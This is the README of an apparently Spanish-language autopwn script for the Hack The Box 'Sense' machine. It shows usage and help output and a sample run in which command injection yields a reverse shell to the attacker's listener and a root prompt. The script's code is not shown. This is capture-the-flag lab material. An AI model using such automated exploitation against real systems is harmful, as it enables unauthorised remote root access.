# Sense-Autopwn

Autopwn de la máquina Sense de la plataforma HTB

## Uso

```bash
❯ python3 sense-autopwn.py
usage: sense-autopwn.py [-h] [--rhost RHOST] --lhost LHOST [--lport LPORT]
sense-autopwn.py: error: the following arguments are required: --lhost
```

```bash
❯ python3 sense-autopwn.py -h
usage: sense-autopwn.py [-h] [--rhost RHOST] --lhost LHOST [--lport LPORT]

Autopwn de la máquina Sense de la plataforma HTB

optional arguments:
  -h, --help     show this help message and exit
  --rhost RHOST  Remote host ip (default: 10.10.10.60)
  --lhost LHOST  Local host ip (Attacker)
  --lport LPORT  Local port (default: 443)
```

## Resultados
```bash
❯ python3 sense-autopwn.py --lhost 10.10.14.27
[+] Conexión: Se ha recibido una conexión
[+] Login: Ingresando exitosamente
[+] Trying to bind to :: on port 443: Done
[+] Waiting for connections on :::443: Got connection from ::ffff:10.10.10.60 on port 18415
[+] RCE: Comando inyectado exitosamente
[*] Switching to interactive mode
$ whoami
root
$ 
```
